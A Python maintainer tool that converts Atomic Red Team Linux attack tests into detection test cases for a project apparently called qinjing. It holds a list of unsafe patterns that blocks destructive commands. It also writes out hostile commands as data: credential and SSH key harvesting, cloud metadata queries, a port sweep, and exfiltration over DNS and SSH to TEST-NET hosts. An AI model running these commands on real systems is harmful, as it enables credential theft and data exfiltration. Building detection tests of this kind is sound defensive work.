#!/usr/bin/env python3
# -*- coding: ascii -*-
"""Atomic Red Team importer (dev tool; NOT part of the qinjing runtime).

qinjing itself stays zero-dependency. This offline maintainer tool adapts
ART (redcanaryco/atomic-red-team) linux bash/sh tests into the qinjing
proposal format. PyYAML is needed only to read the upstream ART files;
the emitted proposal uses the frozen YAML subset enforced by parse.py.

Usage:
    import_art.py <art-repo> --list [Txxxx ...]    candidate report
    import_art.py <art-repo> --generate [--out proposals/art-import-r1.yaml]

Per selected ART atomic test:
    locate by (technique, test name)          -- fails loudly if ART moved
    substitute #{input} from SAFE_VALUES/ART defaults
    hygiene rewrite: TEST-NET addresses, example domains,
        /tmp/qinjing-art-* side-effect paths, throwaway usernames
    signal mapping from TECH_SIGNALS (docs/02 section 3 anchors only;
        techniques without an anchor vocabulary entry become gap cases)
    lint every cmd with parse.cmd_hygiene_errors; validate the emitted
        text with parse.parse_lines + validate before writing anything
"""

import os
import re
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from parse import (IP_RE, TESTNET_RE, _domain_allowed,  # noqa: E402
                   _domain_candidates, _write_targets,
                   cmd_hygiene_errors, parse_lines, validate)

try:
    import yaml
except ImportError:
    sys.stderr.write("PyYAML is required for this dev tool only "
                     "(pip install pyyaml); qinjing runtime stays "
                     "zero-dependency.\n")
    sys.exit(3)


# Safe substitutions for ART input arguments, keyed by argument name.
SAFE_VALUES = {
    "host": "203.0.113.10", "hosts": "203.0.113.10",
    "remote_host": "203.0.113.11", "ip": "203.0.113.12",
    "domain": "art.example", "domain_name": "art.example",
    "user": "qjart", "username": "qjart", "user_account": "qjart",
    "url": "http://203.0.113.10/art", "callback": "203.0.113.13",
    "listener": "203.0.113.14", "output_file": "/tmp/qinjing-art-out",
    "file_path": "/tmp/qinjing-art-file", "filename": "/tmp/qinjing-art-f",
    "payload_path": "/tmp/qinjing-art-payload",
    "local_artifact": "/tmp/qinjing-art-artifact",
    "password": "qjpass", "pass": "qjpass",
    "remote_path": "/tmp/qinjing-art-remote",
    "share_name": "qjshare", "mail_to": "qjart@art.example",
    "mail_from": "qjart@art.example",
}

# Commands that must never be adapted, regardless of technique mapping.
UNSAFE_PATTERNS = (
    r"rm\s+-rf\s+/(?:\s|$)", r"\bof=/dev/(?:sd|vd|nvme|xvd|hd)",
    r":\(\)\s*\{.*\};\s*:", r"\bmkfs", r"shred\s+.*\s/dev/",
    r"chmod\s+-R\s+777\s+/", r"dd\s+.*\bof=/dev/",
)

# technique -> (tactic, signal classes). Signal classes are only listed
# when docs/02 section 3 names the technique as that class's ATT&CK
# anchor, so anchor_lint L3 passes without secondary-anchor edits.
# Empty tuple = no vocabulary anchor: cases import as gap.
TECH_SIGNALS = {
    "T1003.008": ("TA0006", ("credential_dump_shadow",)),
    "T1014": ("TA0005", ()),
    "T1018": ("TA0007", ("net_recon_local",)),
    "T1033": ("TA0007", ()),
    "T1040": ("TA0006", ("sniffer_run",)),
    "T1046": ("TA0007", ("net_scan_external",)),
    "T1048": ("TA0010", ("exfil_transfer",)),
    "T1049": ("TA0007", ("net_recon_local",)),
    "T1053.003": ("TA0003", ("persistence_cron_write",)),
    "T1059.004": ("TA0002", ("download_and_execute", "reverse_shell")),
    "T1070.003": ("TA0005", ("history_clear",)),
    "T1070.004": ("TA0005", ()),
    "T1082": ("TA0007", ("system_discovery",)),
    "T1083": ("TA0007", ("system_discovery",)),
    "T1098.004": ("TA0003", ("persistence_ssh_key",)),
    "T1135": ("TA0006", ()),
    "T1136.001": ("TA0003", ("account_creation",)),
    "T1496": ("TA0040", ("cryptomining",)),
    "T1543.002": ("TA0003", ("persistence_systemd",)),
    "T1546.004": ("TA0003", ("shell_config_persistence",)),
    "T1547.006": ("TA0004", ("kernel_module_load",)),
    "T1548.001": ("TA0004", ("capability_abuse_grant",
                              "setuid_discovery")),
    "T1548.003": ("TA0004", ("sudoers_change",)),
    "T1552.001": ("TA0006", ("credential_file_read",)),
    "T1552.004": ("TA0006", ("credential_env_read",)),
    "T1552.005": ("TA0006", ("cloud_metadata_access",)),
    "T1556.003": ("TA0003", ("persistence_pam",)),
    "T1572": ("TA0008", ("lateral_ssh_tunnel",)),
    "T1574.006": ("TA0004", ("linker_hijack",)),
    "T1685.004": ("TA0005", ("audit_log_tamper",)),
}

# Curated selection: one ART test per entry, in output order.
# signals/impact/mode/bin/name default from the registry and the adapted
# command; override only what the specific test changes. cmd overrides
# replace the auto-adapted command (recorded in the notes file).
class Pick(object):
    def __init__(self, tech, test, signals=None, impact=None, mode=None,
                 bin_name=None, name=None, cmd=None, note=None,
                 creates_process=None):
        self.tech = tech
        self.test = test
        self.signals = signals
        self.impact = impact
        self.mode = mode
        self.bin = bin_name
        self.name = name
        self.cmd = cmd
        self.note = note
        self.creates_process = creates_process


SELECTION = [
    # discovery
    Pick("T1082", "Hostname Discovery", bin_name="hostname"),
    Pick("T1082", "Linux List Kernel Modules", bin_name="lsmod",
         note="three listing commands joined"),
    Pick("T1082", "Linux VM Check via Kernel Modules", bin_name="lsmod",
         note="five lsmod greps joined"),
    Pick("T1083", "Identifying Network Shares - Linux", bin_name="findmnt"),
    Pick("T1018", "Remote System Discovery - ip neighbour", bin_name="ip"),
    Pick("T1018", "Remote System Discovery - ip tcp_metrics", bin_name="ip"),
    Pick("T1018", "Remote System Discovery - netstat", bin_name="netstat",
         mode="sim-missing-bin"),
    Pick("T1018", "Remote System Discovery - arp nix", bin_name="arp",
         mode="sim-missing-bin"),
    Pick("T1018", "Remote System Discovery - sweep", bin_name="ping",
         cmd=("for ip in $(seq 1 254); do ping -c 1 203.0.113.$ip; "
              "[ $? -eq 0 ] && echo \"203.0.113.$ip UP\" || : ; done"),
         note="internal sweep subnet rewritten to TEST-NET-3"),
    Pick("T1049", "System Network Connections Discovery via ss or lsof (Linux/MacOS)",
         bin_name="ss"),
    Pick("T1046", "Port Scan", bin_name="-", mode="sim-builtin",
         creates_process=False,
         note="pure bash /dev/tcp loop, no execve"),
    Pick("T1046", "Port Scan using nmap (Port range)", bin_name="nmap",
         mode="sim-missing-bin",
         cmd="nmap -Pn -sV -p 0-65535 203.0.113.10",
         note="loopback default rewritten to TEST-NET-3"),
    Pick("T1046", "Port Scan Nmap", bin_name="nmap",
         mode="sim-missing-bin"),
    # credential access
    Pick("T1003.008", "Access /etc/shadow (Local)", bin_name="cat",
         impact="temporary", note="two lines joined"),
    Pick("T1003.008", "Access /etc/passwd (Local)", bin_name="cat",
         impact="temporary", note="two lines joined"),
    Pick("T1552.001", "Find AWS credentials", bin_name="find"),
    Pick("T1552.001", "Access Drone CI Config File", bin_name="find",
         impact="temporary"),
    Pick("T1552.001", "Access Gitlab CI Config File", bin_name="find",
         impact="temporary"),
    Pick("T1552.001", "Search for Git Credential Files", bin_name="find",
         impact="temporary"),
    Pick("T1552.001", "Find Azure credentials", bin_name="find",
         impact="temporary"),
    Pick("T1552.001", "Find Docker credentials", bin_name="find",
         impact="temporary"),
    Pick("T1552.001", "Find GCP credentials", bin_name="find",
         impact="temporary"),
    Pick("T1552.001", "Find .env Files Containing Application Credentials",
         bin_name="find", impact="temporary",
         cmd=("find /home /root /opt /srv /var/www /app /data /var/lib /tmp"
              " -maxdepth 6 -name \".env*\" -type f -exec sh -c 'echo"
              " \"=== $1 ===\" >> /tmp/qinjing-art-creds.txt; cat \"$1\""
              " >> /tmp/qinjing-art-creds.txt' _ {} \\; 2>/dev/null"),
         note="macOS /Users dropped from search roots"),
    Pick("T1552.001", "Access Jenkinsfile", bin_name="find",
         impact="temporary"),
    Pick("T1552.001", "Find and Access Github Credentials", bin_name="find",
         impact="temporary"),
    Pick("T1552.001", "Find HashiCorp Vault token files", bin_name="find",
         impact="temporary"),
    Pick("T1552.001", "Find npm registry credential files", bin_name="find",
         impact="temporary"),
    Pick("T1552.001", "Find Kubernetes cluster configuration files",
         bin_name="find", impact="temporary", note="two finds joined"),
    Pick("T1552.001", "Find system database configuration files",
         bin_name="find", impact="temporary", note="two finds joined"),
    Pick("T1552.001", "Extract passwords with grep", bin_name="grep",
         cmd="grep -ri password /etc 2>/dev/null; exit 0",
         note="full-filesystem grep narrowed to /etc"),
    Pick("T1552.004", "Copy Private SSH Keys with CP", bin_name="find",
         impact="temporary",
         cmd=("mkdir /tmp/qinjing-art-art-staging; find /root /home -name"
              " id_rsa 2>/dev/null -exec cp --parents {}"
              " /tmp/qinjing-art-art-staging \\; ; exit 0"),
         note="search root narrowed from / to /root /home; key staging "
              "per xiezhi seed exec-cred-keygen-staging"),
    Pick("T1552.004", "Copy Private SSH Keys with rsync", bin_name="rsync",
         mode="sim-missing-bin", impact="temporary",
         cmd=("mkdir /tmp/qinjing-art-art-staging; find /root /home -name"
              " id_rsa 2>/dev/null -exec rsync -R {}"
              " /tmp/qinjing-art-art-staging \\; ; exit 0"),
         note="search root narrowed from / to /root /home"),
    Pick("T1552.004", "Find TLS private key files", bin_name="find",
         impact="temporary",
         cmd=("for file_extension in *.key *.pem *.p12 *.pfx; do find"
              " /root /home -name \"$file_extension\" -type f -exec sh -c"
              " 'echo \"=== $1 ===\" >> /tmp/qinjing-art-creds.txt;"
              " cat \"$1\" >> /tmp/qinjing-art-creds.txt' _ {} \\;"
              " 2>/dev/null; done"),
         note="search root narrowed from / to /root /home"),
    Pick("T1552.004", "Find WireGuard configuration files", bin_name="find"),
    Pick("T1552.005", "AWS - Retrieve EC2 IAM Role Credentials via IMDSv2",
         bin_name="curl",
         cmd=("token=$(curl -s --connect-timeout 2 -m 5 -X PUT"
              " \"http://169.254.169.254/latest/api/token\""
              " -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\");"
              " curl -s --connect-timeout 2 -m 5"
              " -H \"X-aws-ec2-metadata-token: $token\""
              " \"http://169.254.169.254/latest/meta-data/\""),
         note="neutralized: docs/02 red line keeps IMDS at the top-level"
              " index, credential paths dropped"),
    # persistence
    Pick("T1053.003", "Cron - Add script to /etc/cron.d folder",
         bin_name="-", mode="sim-builtin", impact="destructive",
         creates_process=False,
         note="ART nested-quote mangling kept verbatim"),
    Pick("T1053.003", "Cron - Add script to /var/spool/cron/crontabs/ folder",
         bin_name="-", mode="sim-builtin", impact="destructive",
         creates_process=False),
    Pick("T1053.003", "Cron - Add script to all cron subfolders",
         bin_name="-", mode="sim-builtin", impact="destructive",
         creates_process=False, note="four echoes joined"),
    Pick("T1053.003", "Cron - Replace crontab with referenced file",
         bin_name="crontab", impact="destructive",
         note="two lines joined"),
    Pick("T1098.004", "Modify SSH Authorized Keys", bin_name="-",
         mode="sim-builtin", impact="destructive", creates_process=False),
    Pick("T1136.001", "Create a user account on a Linux system",
         bin_name="useradd", impact="destructive"),
    Pick("T1136.001", "Create a new user in Linux with `root` UID and GID.",
         bin_name="useradd", impact="destructive",
         note="password branch for ubuntu/other distros kept"),
    Pick("T1543.002", "Create Systemd Service", bin_name="systemctl",
         impact="destructive",
         cmd=("printf '[Unit]\\nDescription=Atomic Red Team Systemd"
              " Service\\n\\n[Service]\\nType=simple\\nExecStart=/bin/touch"
              " /tmp/qinjing-art-art-systemd-execstart-marker\\n"
              "ExecStartPre=/bin/true\\nExecStartPost=/bin/true\\n"
              "ExecReload=/bin/true\\nExecStop=/bin/true\\n"
              "ExecStopPost=/bin/true\\n\\n[Install]\\n"
              "WantedBy=default.target\\n' >"
              " /etc/systemd/system/art-systemd-service.service;"
              " systemctl daemon-reload;"
              " systemctl enable art-systemd-service.service;"
              " systemctl start art-systemd-service.service"),
         note="17 echo lines compressed into one printf of the same unit; "
              "fixes ART's missing redirect on the Type=simple line"),
    Pick("T1546.004", "Add command to .bash_profile", bin_name="-",
         mode="sim-builtin", impact="destructive", creates_process=False),
    Pick("T1546.004", "Add command to .bashrc", bin_name="-",
         mode="sim-builtin", impact="destructive", creates_process=False),
    Pick("T1546.004", "Append commands user shell profile", bin_name="-",
         mode="sim-builtin", impact="destructive", creates_process=False),
    Pick("T1546.004", "Append to the system shell profile", bin_name="-",
         mode="sim-builtin", impact="destructive", creates_process=False),
    Pick("T1546.004", "System shell profile scripts", bin_name="-",
         mode="sim-builtin", impact="destructive", creates_process=False),
    Pick("T1556.003", "Malicious PAM rule", bin_name="sed",
         impact="destructive"),
    # privilege escalation
    Pick("T1548.001", "Do reconnaissance for files that have the setuid bit set",
         signals=("setuid_discovery",), bin_name="find"),
    Pick("T1548.001", "Do reconnaissance for files that have the setgid bit set",
         signals=("setuid_discovery",), bin_name="find"),
    Pick("T1548.001", "Provide the SetUID capability to a file",
         signals=("capability_abuse_grant",), bin_name="setcap",
         impact="temporary", note="two lines joined"),
    Pick("T1548.001", "Set a SetUID flag on file",
         signals=("capability_abuse_grant",), bin_name="chmod",
         impact="temporary", note="three lines joined"),
    Pick("T1548.001", "Set a SetGID flag on file",
         signals=("capability_abuse_grant",), bin_name="chmod",
         impact="temporary", note="three lines joined"),
    Pick("T1548.003", "Disable tty_tickets for sudo caching", bin_name="sudo",
         impact="destructive", note="two lines joined"),
    Pick("T1548.003", "Unlimited sudo cache timeout", bin_name="sed",
         impact="destructive", note="two lines joined"),
    Pick("T1547.006", "Linux - Load Kernel Module via insmod",
         bin_name="insmod", mode="sim-missing-bin", impact="destructive",
         note="module file comes from ART get_prereq, absent here: argv-"
              "visible load attempt only"),
    Pick("T1574.006", "Shared Library Injection via /etc/ld.so.preload",
         bin_name="sudo", impact="destructive"),
    Pick("T1574.006", "Shared Library Injection via LD_PRELOAD",
         bin_name="ls"),
    # execution / collection / exfil / c2
    Pick("T1059.004", "Command-Line Interface",
         signals=("download_and_execute",), bin_name="curl",
         note="curl|bash and wget|bash joined"),
    Pick("T1059.004", "Shell Creation using awk command",
         signals=("reverse_shell",), bin_name="awk",
         note="local shell spawn, closest anchored class"),
    Pick("T1059.004", "Shell Creation using busybox command",
         signals=("reverse_shell",), bin_name="busybox",
         mode="sim-missing-bin",
         note="local shell spawn, closest anchored class"),
    Pick("T1059.004", "Creating shell using cpan command",
         signals=("reverse_shell",), bin_name="cpan",
         mode="sim-missing-bin",
         note="local shell spawn, closest anchored class"),
    Pick("T1059.004", "emacs spawning an interactive system shell",
         signals=("reverse_shell",), bin_name="emacs",
         mode="sim-missing-bin",
         note="local shell spawn, closest anchored class"),
    Pick("T1040", "Packet Capture Linux using tshark or tcpdump",
         bin_name="tcpdump", mode="sim-missing-bin",
         cmd="tcpdump -c 5 -nnni eth0; tshark -c 5 -i eth0",
         note="VMware ens33 interface renamed to eth0"),
    Pick("T1048", "Exfiltrate Data using DNS Queries via dig",
         bin_name="dig", mode="sim-missing-bin",
         cmd=("dig @203.0.113.18 -p 53"
              " $(echo \"this is a secret info\" | base64).exfil.example"),
         note="exfil domain hidden inside $() rewritten by hand"),
    Pick("T1048", "Exfiltration Over Alternative Protocol - SSH",
         bin_name="ssh",
         cmd=("tar czpf - /home/* | openssl des3 -salt -pass qjpass |"
              " ssh qjart@203.0.113.20"
              " 'cat > /tmp/qinjing-art-users.tar.gz.enc'"),
         note="macOS /Users rewritten to /home, throwaway user and "
              "TEST-NET-3 destination"),
    Pick("T1572", "VSCode tunnels (Linux/macOS)", bin_name="code",
         mode="sim-missing-bin"),
    Pick("T1496", "FreeBSD/macOS/Linux - Simulate CPU Load with Yes",
         bin_name="yes"),
    # defense evasion
    Pick("T1070.003", "Clear Bash history (cat dev/null)", bin_name="cat",
         impact="destructive"),
    Pick("T1070.003", "Clear Bash history (echo)", bin_name="-",
         mode="sim-builtin", impact="destructive", creates_process=False),
    Pick("T1070.003", "Clear Bash history (ln dev/null)", bin_name="ln",
         impact="destructive"),
    Pick("T1070.003", "Clear Bash history (rm)", bin_name="rm",
         impact="destructive"),
    Pick("T1070.003", "Clear Bash history (truncate)", bin_name="truncate",
         impact="destructive"),
    Pick("T1070.003", "Disable Bash History Logging with SSH -T",
         bin_name="sshpass", mode="sim-missing-bin",
         note="ssh without pty history logging"),
    # vocabulary gaps: imported to document coverage holes
    Pick("T1014", "Loadable Kernel Module based Rootkit",
         bin_name="modprobe", impact="destructive",
         note="rootkit load: no vocabulary class anchors T1014"),
    Pick("T1135", "Network Share Discovery - linux", bin_name="smbstatus",
         mode="sim-missing-bin",
         note="share discovery: no vocabulary class anchors T1135"),
    Pick("T1033", "System Owner/User Discovery", bin_name="w",
         note="three listing commands joined"),
    Pick("T1070.004", "Overwrite and delete a file with shred",
         bin_name="shred", impact="temporary",
         note="file deletion: no vocabulary class anchors T1070.004"),
    Pick("T1070.004", "Delete an entire folder - FreeBSD/Linux/macOS",
         bin_name="rm", impact="temporary",
         note="folder deletion: no vocabulary class anchors T1070.004"),
]


def load_art(art_root):
    """All linux bash/sh atomic tests keyed by (technique, test name)."""
    index = {}
    atomics = os.path.join(art_root, "atomics")
    for folder in sorted(os.listdir(atomics)):
        if not re.match(r"^T\d{4}", folder):
            continue
        path = os.path.join(atomics, folder, folder + ".yaml")
        if not os.path.isfile(path):
            continue
        with open(path, encoding="utf-8") as fh:
            doc = yaml.safe_load(fh)
        tech = doc.get("attack_technique", folder)
        for test in doc.get("atomic_tests") or []:
            platforms = test.get("supported_platforms") or []
            executor = (test.get("executor") or {})
            if "linux" not in platforms:
                continue
            if executor.get("name") not in ("bash", "sh"):
                continue
            command = executor.get("command") or ""
            index[(tech, test.get("name", ""))] = {
                "command": command,
                "defaults": {k: (v or {}).get("default")
                             for k, v in (test.get("input_arguments")
                                          or {}).items()},
                "dependencies": bool(test.get("dependencies")),
                "executor": executor.get("name"),
            }
    return index


def substitute(command, defaults):
    def repl(match):
        key = match.group(1)
        if defaults.get(key) is not None:
            return str(defaults[key])
        if key in SAFE_VALUES:
            return SAFE_VALUES[key]
        raise ValueError("no safe value for #{%s}" % key)
    return re.sub(r"#\{([A-Za-z0-9_]+)\}", repl, command)


def hygiene_rewrite(command):
    def ip_repl(match):
        addr = match.group(1)
        if addr == "127.0.0.1" or addr == "169.254.169.254" \
                or TESTNET_RE.match(addr):
            return addr
        return "203.0.113.%d" % (10 + int(addr.rsplit(".", 1)[1]) % 100)
    command = IP_RE.sub(ip_repl, command)
    for cand in _domain_candidates(command):
        if not _domain_allowed(cand):
            labels = cand.split(".")
            mapped = ".".join(labels[-2:]) + ".example"
            command = command.replace(cand, mapped)
    command = re.sub(r"/tmp/(?!qinjing-)", "/tmp/qinjing-art-", command)
    command = re.sub(r"\buseradd\s+atomic\b", "useradd qjart", command)
    for pattern in UNSAFE_PATTERNS:
        if re.search(pattern, command):
            raise ValueError("unsafe command rejected: %s" % command[:70])
    return command


def adapt(pick, index):
    """One ART test -> full case dict for the proposal, or raises."""
    record = index.get((pick.tech, pick.test))
    if record is None:
        raise ValueError("%s: test %r not found in ART index"
                         % (pick.tech, pick.test))
    if pick.cmd is not None:
        command = pick.cmd
    else:
        command = hygiene_rewrite(substitute(record["command"],
                                             record["defaults"]))
        command = "; ".join(line.strip()
                            for line in command.strip().splitlines()
                            if line.strip())
    command = " ".join(command.split())
    tactic, signals = TECH_SIGNALS.get(pick.tech, ("TA0002", ()))
    if pick.signals is not None:
        signals = pick.signals
    expect = "detectable" if signals else "gap"
    impact = pick.impact or "none"
    problems = cmd_hygiene_errors(command, impact)
    if problems:
        raise ValueError("%s hygiene: %s" % (pick.tech, problems[0]))
    if not command.isascii():
        raise ValueError("%s: non-ASCII command" % pick.tech)
    cleanup_targets = []
    mkdirs = set(re.findall(r"mkdir(?:\s+-p)?\s+(/\S+)", command))
    for raw in _write_targets(command):
        target = raw.strip("'\"")
        if target.startswith("/tmp/qinjing-") and not target.endswith("/") \
                and target not in mkdirs and target not in cleanup_targets:
            cleanup_targets.append(target)
    return {
        "tactic": tactic, "signals": list(signals), "expect": expect,
        "impact": impact, "cmd": command,
        "cleanup": ("rm -f " + " ".join(cleanup_targets))
        if cleanup_targets else "",
        "mode": pick.mode or "real", "bin": pick.bin or "-",
        "name": pick.name or _default_name(pick.test),
        "creates_process": (pick.creates_process if
                            pick.creates_process is not None else True),
    }


def _default_name(test_name):
    words = re.sub(r"[^A-Za-z0-9 ]+", " ", test_name).split()
    text = " ".join(w.lower() for w in words)
    return (text[:64] + "...") if len(text) > 67 else text


def serialize(cases, art_sha):
    lines = [
        "# Generated by tools/import_art.py from atomic-red-team@%s"
        % art_sha[:12],
        "# Do not edit by hand; adapt SELECTION in the tool and regenerate.",
        "", "false_positives:", "", "attacks:",
    ]
    for seq, case in enumerate(cases, 1):
        esc_cmd = case["cmd"].replace("'", "''")
        lines.extend([
            "  - id: AR%02d" % seq,
            "    tactic: %s" % case["tactic"],
            "    technique: %s" % case["tech"],
            "    name: '%s'" % case["name"].replace("'", "''"),
            "    platforms: [linux]",
            "    cmd: '%s'" % esc_cmd,
            "    bin: '%s'" % case["bin"],
            "    creates_process: %s"
            % ("true" if case["creates_process"] else "false"),
            "    mode: %s" % case["mode"],
            "    expected_signals: [%s]" % ", ".join(case["signals"]),
            "    related_signals: []",
            "    expect: %s" % case["expect"],
            "    impact: %s" % case["impact"],
        ])
        if case["cleanup"]:
            lines.append("    cleanup: %s" % case["cleanup"])
    return "\n".join(lines) + "\n"


def main(argv):
    if len(argv) < 3:
        sys.stderr.write(__doc__)
        return 2
    art_root = argv[1]
    mode = argv[2]
    index = load_art(art_root)
    if mode == "--list":
        techs = argv[3:] or None
        for (tech, name), rec in sorted(index.items()):
            if techs and tech not in techs:
                continue
            try:
                cmd = hygiene_rewrite(substitute(rec["command"],
                                                 rec["defaults"]))
                nlines = len(cmd.strip().splitlines())
                status = "L1" if nlines <= 1 else "L%d" % nlines
            except ValueError as exc:
                status = "REJECT(%s)" % str(exc)[:40]
                cmd = rec["command"]
            cmd = " ".join(cmd.split())[:100]
            local = "" if ("PathToAtomicsFolder" in cmd
                           or "ExternalPayloads" in cmd) else "*"
            print("%s | %-40s | %s%s%s | %s" % (
                tech, name[:40], status,
                "+deps" if rec["dependencies"] else "", local,
                cmd))
        print("# %d linux bash/sh tests indexed" % len(index))
        return 0
    if mode != "--generate":
        sys.stderr.write(__doc__)
        return 2
    out_path = argv[3] if len(argv) > 3 else os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        "proposals", "art-import-r1.yaml")
    sha = subprocess.check_output(
        ["git", "-C", art_root, "rev-parse", "HEAD"],
        text=True).strip()
    cases, rejects = [], []
    for pick in SELECTION:
        try:
            case = adapt(pick, index)
        except ValueError as exc:
            rejects.append(str(exc))
            continue
        case["tech"] = pick.tech
        case["art_test"] = pick.test
        case["note"] = pick.note or ""
        case["cmd_override"] = pick.cmd is not None
        cases.append(case)
    if rejects:
        for line in rejects:
            sys.stderr.write("REJECT: %s\n" % line)
    text = serialize(cases, sha)
    problems = validate(parse_lines(text.splitlines()))
    if problems:
        for problem in problems:
            sys.stderr.write("INVALID: %s\n" % problem)
        return 1
    with open(out_path, "w", encoding="ascii", newline="\n") as fh:
        fh.write(text)
    mapped = sum(1 for c in cases if c["expect"] == "detectable")
    print("generated %d cases (%d detectable, %d gap) -> %s"
          % (len(cases), mapped, len(cases) - mapped, out_path))
    if rejects:
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
